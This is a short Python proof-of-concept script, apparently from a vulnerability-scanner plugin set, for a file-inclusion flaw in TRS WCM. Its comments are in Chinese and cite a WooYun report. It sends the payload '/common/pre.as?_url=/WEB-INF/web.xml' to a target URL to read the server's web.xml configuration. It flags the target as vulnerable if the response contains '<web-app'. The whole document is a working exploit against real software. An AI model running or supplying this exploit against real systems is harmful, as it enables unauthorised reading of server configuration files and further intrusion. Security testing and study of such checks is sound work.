#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm pre.as 文件包含
referer: http://www.wooyun.org/bugs/wooyun-2015-0120447
author: Lucifer
description: 文件common/pre.as中,参数_url未过滤存在文件包含漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS wcm pre.as 文件包含','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/common/pre.as?_url=/WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"<web-app" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
